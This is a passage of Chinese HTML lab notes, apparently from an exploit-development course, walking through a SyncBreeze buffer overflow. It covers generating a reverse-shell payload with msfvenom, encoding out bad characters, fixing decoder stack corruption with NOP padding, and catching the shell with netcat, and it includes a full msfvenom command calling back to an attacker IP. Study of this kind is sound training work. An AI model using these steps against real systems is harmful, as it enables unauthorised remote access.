+<a name="23lr87aiadog01g23jb840ijqt">&nbsp;&nbsp;使用-p生成称为Windows / shell_reverse_tcp的基本有效负载，其作用类似于Netcat反向外壳。 该有效负载至少需要一个LHOST参数，该参数定义了外壳程序的目标IP地址。 也可以定义一个可选的LPORT参数，指定连接回端口，并且我们将使用格式标志-f选择C格式的shellcode。</a>
+</h3>
+<h3 class="topic">
+<a name="1gmt8op3msuhe37n2nh1ml0aoj">&nbsp;&nbsp;&nbsp;注意lhost和lport指定的是攻击方的ip地址和端口，shell运行后会主动连接攻击方</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/3m11k6m1uk34pf10mu9diq9g6b.png"></p>
+<h3 class="topic">
+<a name="03avnf6kcm0k0p4s98i0bja7o1">&nbsp;&nbsp;去除坏字符</a>
+</h3>
+<h3 class="topic">
+<a name="2v2sdoo72stmahfdg1ma20nema">&nbsp;&nbsp;&nbsp;当我们无法使用通用shellcode时，我们必须对其进行编码以适合我们的目标利用环境。 这可能意味着将我们的shellcode转换为纯字母数字的有效载荷，摆脱不良字符等。</a>
+</h3>
+<h3 class="topic">
+<a name="65n910lnb8ikmda5dgr591eapo">&nbsp;&nbsp;&nbsp;&nbsp;使用高级多态编码器shikata_ga_nai来编码我们的shellcode，还将使用-b选项通知编码器已知的不良字符</a>
+</h3>
+<h3 class="topic">
+<a name="7k53a6oju3gh4o62iag2r6b3ar">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-e指定要使用的编码器 -b指定坏字符</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/67v9jp3d236b9e1dt01ipjb4bf.png"></p>
+<h3 class="topic">
+<a name="4fggcfma0iadtkjgndcs7t3geg">&nbsp;获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="2mma67ht38q673f9a01v3rusqc">&nbsp;&nbsp;现在，从SyncBreeze获取反向外壳应该很简单，只需用shellcode替换D的缓冲区并启动我们的漏洞利用即可。</a>
+</h3>
+<h3 class="topic">
+<a name="2voepqhhfve7t83tma7vhreuiq">&nbsp;&nbsp;&nbsp;问题在于之前为了避免坏字符，将payload使用shikata_ga_nai编码器编码，编码后的payload需要解码后才能执行，而接码的代码被放置在payload头部，即jmp esp执行之后payload会先执行解码代码</a>
+</h3>
+<h3 class="topic">
+<a name="2omhvkrf7h50urd6273prfqbfo">&nbsp;&nbsp;&nbsp;&nbsp;在解码代码中，需要使用getpc指令获得当前eip的值，从而定义需要解码的payload，getpc过程中需要向栈中存储数据，而payload整体就是保存在栈顶起始的内存中，所以getpc过程中可能会导致写入栈的数据破坏了解码代码或已经编码的payload，最后导致shellcode执行失败</a>
+</h3>
+<h3 class="topic">
+<a name="0q96nlsun8t89fqd4phut4q7rk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时程序正在栈中执行代码，但是栈中代码部分数据被覆盖，导致运行崩溃</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/78skoo7auttviguar897kts7iq.png"></p>
+<h3 class="topic">
+<a name="7ort1sscn8iefvshvqatuet9dn">&nbsp;&nbsp;解决上面问题的方法是在执行解码器之前使用DEC ESP，SUB ESP，0xXX等汇编指令来向后调整ESP。或者在JMP ESP创建一个宽阔的padding，即在jmp esp指令地址之后，payload之前加上9090或0c0c等不影响程序执行的指令，eip一旦开始执行此类执行，会向后继续执行，直到开始执行payload（此时padding的存在也相当于抬高了esp，从而防止栈中有效代码被覆盖）</a>
+</h3>
+<h3 class="topic">
+<a name="43r2fsmvtkons3k08sp0igl509">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/19v6bdj2nrj17r0hac55gde6mn.png"></p>
+<h3 class="topic">
+<a name="4k7cq56oe9ap9n6oibmg50ufmf">&nbsp;&nbsp;&nbsp;&nbsp;在shellcode前增加了padding的exp</a>
+</h3>
+<h3 class="topic">
+<a name="31umbkhcdmi52nc0d8chj2ha7p">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/7tggs4tgd23i85juu0p23f8usa.png"></p>
+<h3 class="topic">
+<a name="7hc3m9hm2mluit3ghemjosmbb9">&nbsp;&nbsp;在攻击机中使用nc设置对443端口的监听，然后执行脚本获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="6v1spa8tdk1tpvke7hkpke28pl">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA_files/1hfhu6p682ron963tmj83uslqm.png"></p>
+<h3 class="topic">
+<a name="6n08co1494gt8p2e3dnnaairde">&nbsp;改善漏洞利用</a>
+</h3>
+<h3 class="topic">
+<a name="4r9cb196bl4n32kt8kgvbnlbjb">&nbsp;&nbsp;shellcode执行后，Metasploit shellcode的默认退出方法是ExitProcess API。 当反向外壳终止时，此退出方法将关闭整个Web服务过程，从而有效地杀死SyncBreeze服务并使其崩溃。&#13;
+   如果我们要利用的程序是线程应用程序，并且在这种情况下，我们可以尝试通过使用ExitThread API来避免完全崩溃服务，该方法只会终止程序的受影响线程。 这将使我们的利用工作得以正常进行，而不会中断SyncBreeze服务器的常规操作，并使我们能够重复利用该服务器并退出Shell而无需关闭服务。</a>
+</h3>
+<h3 class="topic">
+<a name="1kn896fk8c631t18lb1jbgb812">&nbsp;&nbsp;&nbsp;kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC= thread -f c &ndash;e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"</a>
+</h3>
+<h3 class="topic">
+<a name="1n8ii7dklreulfp9tpntj6sk7g">&nbsp;&nbsp;&nbsp;&nbsp;通过指定EXITFUNC参数，从而指定shellcode使用exitthread退出</a>
+</h3>
+</body>
+</html>
